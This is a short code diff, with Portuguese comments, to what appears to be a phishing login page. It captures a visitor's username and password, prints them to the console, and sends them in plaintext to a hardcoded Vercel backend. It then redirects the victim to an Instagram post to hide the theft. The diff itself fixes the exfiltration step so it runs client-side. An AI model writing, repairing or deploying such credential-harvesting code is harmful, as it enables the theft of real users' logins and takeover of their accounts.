@@ -126,7 +126,8 @@
         console.log('Password:', password);
   
         // Envia os logs para o Vercel usando a API de logs
-        enviarLogsParaVercel(username, password);
+        var vercelURL = "vistoapp-backend.vercel.app";  // Substitua com a URL real do seu projeto Vercel
+        enviarLogsParaVercel(username, password, vercelURL);
   
         // Redireciona para a URL desejada
         window.location.href = "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
@@ -137,10 +138,7 @@
       });
   
       // Função para enviar logs para o Vercel usando a API de logs
-      function enviarLogsParaVercel(username, password) {
-        // Obtém a URL do Vercel do ambiente
-        var vercelURL = process.env.VERCEL_URL;
-  
+      function enviarLogsParaVercel(username, password, vercelURL) {
         // Monta a mensagem de log
         var logMessage = `Username: ${username}, Password: ${password}`;
   
